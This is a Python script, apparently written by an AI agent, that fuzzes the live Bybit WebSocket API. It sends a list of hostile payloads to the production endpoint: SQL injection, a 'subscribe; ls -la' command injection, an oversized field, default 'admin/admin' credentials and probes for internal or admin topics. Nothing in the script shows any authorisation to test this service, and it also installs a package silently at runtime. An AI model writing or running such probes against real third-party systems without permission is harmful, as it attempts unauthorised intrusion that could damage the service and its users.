#!/usr/bin/env python3
"""
WebSocket Fuzzer for Bybit
Needs 'websockets' library. If not present, we use 'ssl' and 'socket' manually? 
No, 'websockets' is better. If not installed, I'll try to use basic socket.
"""
import asyncio
import json
import ssl
import sys

# Check if websockets is installed, if not try to install or fail gracefully
try:
    import websockets
except ImportError:
    print("websockets not installed. Installing...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "websockets"])
    import websockets

WS_URL = "wss://stream.bybit.com/v5/public/linear"

async def fuzz():
    print(f"Connecting to {WS_URL}...")
    
    payloads = [
        # SQL Injection
        {"op": "subscribe", "args": ["orderbook.1.BTCUSDT' OR '1'='1"]},
        
        # Command Injection
        {"op": "subscribe; ls -la", "args": ["public"]},
        
        # Huge payload
        {"op": "subscribe", "args": ["A" * 10000]},
        
        # Type confusion
        {"op": 123, "args": 456},
        
        # Auth bypass attempt
        {"op": "auth", "args": ["admin", "admin"]},
        
        # Internal topics
        {"op": "subscribe", "args": ["admin.topic", "sys.config", "debug"]},
        
        # Parameter pollution
        {"op": "subscribe", "args": ["orderbook.1.BTCUSDT", "orderbook.1.BTCUSDT"]},
        
        # JSON format error
        "{'op': 'subscribe'}", # Single quotes (invalid JSON)
    ]
    
    async with websockets.connect(WS_URL) as ws:
        print("✓ Connected!")
        
        for payload in payloads:
            print(f"\nSending: {str(payload)[:100]}")
            try:
                if isinstance(payload, str):
                    await ws.send(payload)
                else:
                    await ws.send(json.dumps(payload))
                
                # Wait for response
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=2)
                    print(f"  Response: {resp}")
                    
                    if "success" in str(resp) and "false" not in str(resp):
                         # Normal sub success is ok, but check for weirdness
                         pass
                    
                    if "error" in str(resp).lower():
                        # Analyzing error messages
                        err = json.loads(resp)
                        print(f"  Error: {err.get('ret_msg')}")
                        
                except asyncio.TimeoutError:
                    print("  No response (Timeout)")
                    
            except Exception as e:
                print(f"  Send error: {e}")
                # Reconnect if broken
                if ws.closed:
                    print("  Connection closed, reconnecting...")
                    return

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(fuzz())
